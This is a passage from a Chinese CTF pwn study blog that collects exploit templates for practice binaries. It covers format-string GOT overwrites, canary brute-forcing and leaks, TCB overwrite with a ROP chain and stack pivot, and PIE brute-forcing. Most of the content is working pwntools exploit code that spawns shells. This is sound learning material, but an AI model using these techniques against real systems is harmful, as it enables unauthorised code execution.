</li>
<li><p>换成9，还要加上补位AAA</p>
<p><img src="/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/5.png" alt="5"></p>
<p>也许达到这种效果才行吧。</p>
</li>
</ul>
<p>这里直接给模板了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25959</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./mrctf2020_easy_equation&quot;)</span></span><br><span class="line"></span><br><span class="line">judge = <span class="number">0x060105C</span></span><br><span class="line">payload = <span class="string">b&quot;BB%9$nAAA&quot;</span>+p64(judge) <span class="comment">#偏移量这里是9，具体根据实际情况。BB是因为judge要修改成2。#AAA是用来补位的</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="n篡改printf-got指向system"><a href="#n篡改printf-got指向system" class="headerlink" title="%n篡改printf_got指向system"></a>%n篡改printf_got指向system</h3><p>例题ctfshow pwn95</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &quot;amd64&quot;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &quot;i386&quot;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwn95&quot;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28204</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn95&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;    * *************************************                           &quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">6</span> <span class="comment">#偏移量根据具体情况来定</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload1 = p32(printf_got) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line">r.send(payload1)</span><br><span class="line">printf_addr = u32(r.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got:system_addr&#125;)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment">#%p %p %p %p %p</span></span><br></pre></td></tr></table></figure>

<p>例题 buuctf axb_2019_fmt32</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &quot;amd64&quot;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &quot;i386&quot;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwn95&quot;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26279</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb_2019_fmt32&quot;</span>)</span><br><span class="line">offset = <span class="number">8</span> </span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1 =<span class="string">b&#x27;a&#x27;</span> + p32(puts_got) + <span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">r.sendafter(<span class="string">&quot;Please tell me:&quot;</span>,payload1)</span><br><span class="line">puts_addr = u32(r.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload =  <span class="string">b&#x27;A&#x27;</span> +fmtstr_payload(offset,&#123;printf_got:system_addr&#125;,write_size=<span class="string">&#x27;byte&#x27;</span>,numbwritten=<span class="number">0xa</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;Please tell me:&quot;</span>,payload)</span><br><span class="line">r.sendline(<span class="string">b&#x27;;/bin/sh&#x27;</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment">#%p %p %p %p %p</span></span><br></pre></td></tr></table></figure>



<h2 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h2><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>这里有一个<a href="http://linkpwn.github.io/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/">模拟canary爆破</a></p>
<p>模板</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;pwn.challenge.ctf.show&quot;,28257)</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn119&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn119&#x27;</span>)</span><br><span class="line"></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line"></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xC</span>) + canary + p8(j)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line">    res = r.recv()</span><br><span class="line">    <span class="keyword">if</span> ( <span class="string">b&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;the <span class="subst">&#123;i&#125;</span> is <span class="subst">&#123;<span class="built_in">hex</span>(j)&#125;</span>&#x27;</span>)</span><br><span class="line">        canary += p8(j)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">assert</span>(<span class="built_in">len</span>(canary) == i+<span class="number">2</span>) </span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Canary : <span class="subst">&#123;<span class="built_in">hex</span>(u32(canary))&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次溢出</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u32(canary)))</span><br><span class="line">payload = cyclic(<span class="number">0x70</span> - <span class="number">0xC</span>) + canary + cyclic(<span class="number">0xc</span>) + p32(backdoor)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="SSP泄露Canary"><a href="#SSP泄露Canary" class="headerlink" title="SSP泄露Canary"></a>SSP泄露Canary</h3><p>ctfshow pwn117<br>这里主要记录怎么算偏移即buf和__libc_argv[0]的偏移</p>
<p>脚本除了偏移的计算其他都好理解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28116</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag = <span class="number">0x6020a0</span></span><br><span class="line">offset = <span class="number">504</span></span><br><span class="line">payload = cyclic(offset) + p64(flag)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>计算过程先</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyclic 100</span><br></pre></td></tr></table></figure>

<p>再进行gdb调试先输入cyclic的结果，再通过如下两种方式计算<a href="http://www.qfrost.com/posts/ctf/ssp_leak/">参考</a></p>
<p><img src="/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/1.png" alt="1"></p>
<p><img src="/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/2.png" alt="2"></p>
<p><img src="/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/3.png" alt="3"></p>
<p>理论上应该是520才对，504可能是本题有点问题。</p>
<h3 id="覆盖截断字符获取Canary"><a href="#覆盖截断字符获取Canary" class="headerlink" title="覆盖截断字符获取Canary"></a>覆盖截断字符获取Canary</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-D8h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">200</span>]; <span class="comment">// [esp+4h] [ebp-D4h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+CCh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x200u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&quot;pwn.challenge.ctf.show&quot;, xxxxx)</span></span><br><span class="line">r = process(<span class="string">&quot;./pwn115&quot;</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./pwn115&#x27;</span>)</span><br><span class="line">backdoor = elf.sym[<span class="string">&quot;backdoor&quot;</span>]</span><br><span class="line"><span class="comment">#泄露canary</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;Try Bypass Me!&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">200</span> <span class="comment">#buf的偏移值</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;A&quot;</span>*<span class="number">200</span>)</span><br><span class="line">Canary = u32(r.recv(<span class="number">4</span>))-<span class="number">0xa</span> <span class="comment">#0xa是剪掉上面的换行</span></span><br><span class="line">log.info(<span class="string">&quot;Canary&quot;</span>+<span class="built_in">hex</span>(Canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">200</span> + p32(Canary)+<span class="string">b&quot;A&quot;</span>*<span class="number">0x0c</span>+p32(backdoor)<span class="comment">#64位需要加一个ret</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="格式化字符串劫持-stack-chk-fail指针"><a href="#格式化字符串劫持-stack-chk-fail指针" class="headerlink" title="格式化字符串劫持__stack_chk_fail指针"></a>格式化字符串劫持__stack_chk_fail指针</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn118&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&#x27;pwn.challenge.ctf.show&#x27;,xxxxx)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn118&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_chk_fail_got = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">getflag = elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;stack_chk_fail_got: getflag&#125;)</span><br><span class="line">payload = payload.ljust(<span class="number">0x5c</span>, <span class="string">b&#x27;a&#x27;</span>) <span class="comment">#偏移量根据实际情况定</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="canary-格式化字符串"><a href="#canary-格式化字符串" class="headerlink" title="canary,格式化字符串"></a>canary,格式化字符串</h3><p>见另一篇<a href="http://linkpwn.github.io/2025/02/11/pwn98-canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">文章</a></p>
<h3 id="覆盖TCB来实现对canary的绕过"><a href="#覆盖TCB来实现对canary的绕过" class="headerlink" title="覆盖TCB来实现对canary的绕过"></a>覆盖TCB来实现对canary的绕过</h3><p>还是没搞懂，等搞懂了再来写，先留个模板–来自<a href="https://zx2023qj.github.io/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/">佬的blog</a>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn120&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="string">&#x27; xxxxx&#x27;</span>)</span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn120&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4007d8</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400be1</span></span><br><span class="line">leave_ret = <span class="number">0x40098c</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>] </span><br><span class="line">puts_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_addr = <span class="number">0x602010</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x510</span> + p64(bss_addr - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(read_plt)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x1000</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;How much do you want to send this time?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;See you next time!\n&quot;</span>)</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于使用的不是题目虚拟机，这里也就没有对应的libc库，所以直接用wp里面给的，当然也可以直接把可能的libc全试一遍，但是这里就不这么做了。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正确的libc是libc6_2.27-3ubuntu1.6_amd64</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f302</span></span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>ctfshow pwn89</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> newthread[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  newthread[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  pthread_create(newthread, <span class="number">0LL</span>, start, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( pthread_join(newthread[<span class="number">0</span>], <span class="number">0LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;exit failure&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye bye&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">start</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-1018h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">4104</span>]; <span class="comment">// [rsp+10h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1000u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFshowPWN!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You want to send:&quot;</span>);</span><br><span class="line">  v2 = lenth();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x10000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    readn(<span class="number">0LL</span>, s, v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;See you next time!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Are you kidding me?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键为什么能绕过 canary</p>
<p>正常情况下栈保护是：<code>stack_copy_on_stack</code>  vs <code>stack_guard_in_TCB (fs:0x28)</code> 比较。此处能绕过的关键链条：</p>
<ol>
<li>程序在新线程的栈顶附近放了 TCB，<code>stack_guard</code> 在那个附近可被写到（实现细节见 glibc 分配策略）。</li>
<li>读入的数据长度远大于本地 buffer（允许写穿 buffer 到栈顶区域）。</li>
<li>溢出写同时 <strong>覆盖了栈上的 canary 副本（stack copy）与 TCB 中的主 canary</strong>，把它们都改成攻击者任意的值 → 因为校验比较的两端都被同步改写，于是检查通过。</li>
<li>同一次写还能把 saved rbp&#x2F;ret 等覆盖为攻击者需要的值，从而做 ROP、leak、写二阶段并 pivot 到 <code>.bss</code>。</li>
</ol>
<p>换言之：不是“绕过检测逻辑本身”的巧妙 trick，而是“把检测所依赖的参考值（主 canary）用一次大写覆盖成期望值”，从而让检查失效。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;../pwn89&#x27;)</span></span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;../pwn89&#x27;,&#x27;b main&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="string">&#x27; xxxxxx&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../pwn89&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400be3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400be1</span></span><br><span class="line">leave_ret = <span class="number">0x40098c</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_addr = <span class="number">0x602f00</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1010</span> + p64(bss_addr - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(read_plt)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;You want to send:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x2000</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;See you next time!\n&quot;</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于使用的不是题目虚拟机，这里也就没有对应的libc库，所以直接用wp里面给的，当然也可以直接把可能的libc全试一遍，但是这里就不这么做了。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正确的libc是libc6_2.27-3ubuntu1.6_amd64</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f302</span></span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>p64(pop_rdi_ret) + p64(0)</p>
<p>设置 rdi &#x3D; 0（stdin 文件描述符）为接下来 read 的第一个参数（fd &#x3D; 0）。</p>
<p>p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(0)</p>
<p>gadget 做 pop rsi; pop r15; ret：它把 bss_addr 赋给 rsi（第二个参数），并把 0 弹到 r15（只是占位&#x2F;对齐，r15 在这里不被 read 使用）。</p>
<h3 id="puts泄露canary"><a href="#puts泄露canary" class="headerlink" title="puts泄露canary"></a>puts泄露canary</h3><p>见我的<a href="https://blog.csdn.net/mcmuyanga/article/details/109776976">另一篇文章</a>和覆盖截断字符获取Canary类似</p>
<h2 id="PIE绕过"><a href="#PIE绕过" class="headerlink" title="PIE绕过"></a>PIE绕过</h2><h3 id="爆破pie"><a href="#爆破pie" class="headerlink" title="爆破pie"></a>爆破pie</h3><p>模板</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x18</span> + <span class="number">0x4</span></span><br><span class="line">backdoor = <span class="string">b&quot;\xF0&quot;</span> + <span class="string">b&quot;\x06&quot;</span> <span class="comment">#backdoor的地址</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * padding + backdoor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		count += <span class="number">1</span></span><br><span class="line">		<span class="built_in">print</span>(count,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">		r.recvuntil(<span class="string">b&quot;xxxxxxxx&quot;</span>) <span class="comment">#根据具体情况</span></span><br><span class="line">		r.send(payload)</span><br><span class="line">		recv = r.recv(timeout=<span class="number">10</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		r.interactive()</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="格式化字符串泄露pie和partial-write"><a href="#格式化字符串泄露pie和partial-write" class="headerlink" title="格式化字符串泄露pie和partial write"></a>格式化字符串泄露pie和partial write</h3><p>推荐个<a href="https://xz.aliyun.com/news/12255?u_atoken=37fc6f7aae7e8e30badd1dee47edfe42&u_asig=1a0c39d417411687232004179e0034&time__1311=n4mx2iitKWqQwxCqD5DsD7fbD=Kq0IEYveIoK=x">佬的博客</a>(格式化和32位pw)</p>
<p><a href="https://cloud.tencent.com/developer/article/2063640">佬的博客2</a>(64位pw)</p>
<p>64位模板</p>
